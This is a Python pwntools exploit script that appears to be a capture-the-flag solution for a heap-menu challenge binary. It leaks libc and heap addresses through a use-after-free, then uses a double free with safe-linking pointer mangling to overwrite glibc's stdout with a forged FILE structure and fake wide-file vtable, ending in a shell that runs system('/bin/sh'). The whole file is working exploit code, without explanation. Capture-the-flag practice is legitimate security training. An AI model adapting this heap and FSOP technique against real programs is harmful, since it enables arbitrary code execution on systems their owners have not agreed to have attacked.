#!/usr/bin/python3

from pwn import *

exe = 'chall_patched'
elf = context.binary = ELF(exe, checksec = False)
libc = ELF('libc.so.6', checksec = False)

encode  = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l.ljust(8, b"\x00"))
info = lambda msg: log.info(msg)
sla  = lambda msg, data: p.sendlineafter(msg, data)
sa   = lambda msg, data: p.sendafter(msg, data)
sl   = lambda data: p.sendline(data)
s    = lambda data: p.send(data)
r    = lambda nbytes: p.recv(nbytes)
ru   = lambda data: p.recvuntil(data)
rl   = lambda : p.recvline()


def GDB(): gdb.attach(p, gdbscript='''
b*0x00005555555555ee
b*0x00005555555556ca
b*0x0000555555555931
b*0x000055555555583f
c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe], aslr=False)
if args.GDB: GDB(); input()

def add(idx, size):
	sla(b'Your choice:', b'1')
	sla(b'Index:', encode(idx))
	sla(b'Size:', encode(size))

def delete(idx):
	sla(b'Your choice:', b'2')
	sla(b'Index:', encode(idx))

def write(idx, size, data):
	sla(b'Your choice:', b'3')
	sla(b'Index:', encode(idx))
	sla(b'Size:', encode(size))
	sl(encode(data))

def print_(idx):
	sla(b'Your choice:', b'4')
	sla(b'Index:', encode(idx))

def double_free_write(address, data):
	size = len(data) + 0x10 - (len(data) % 0x10) + 0x10
	address = p64(address ^ (heap + 0x9c0 >> 12))
	add(1, size)
	delete(1)
	write(1, 0x20 - 1, "A"*10)
	delete(1)

	write(1, len(address) + 1, address)
	add(2, size)
	add(3, size)
	write(3, len(data), data)


add(0, 2000)
add(1, 0x50)
delete(0)
print_(0)
ru(b'Data: ')
leak = fixleak(r(6))
libc.address = leak - 0x21ace0
print(hex(libc.address))
write(1, 0x10, b'A')
delete(1)
print_(1)
ru(b'Data: ')	
a = r(5)
print(a)
print(fixleak(a))
heap = fixleak(a) << 12
print(hex(heap))
add(2, 0x50)

stdout_lock = libc.sym._IO_stdfile_1_lock
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x00000000001636a0

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')
fake._lock= libc.sym._IO_stdfile_1_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = libc.sym._IO_wide_data_1
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

double_free_write(libc.sym['_IO_2_1_stdout_'], bytes(fake))

p.interactive()
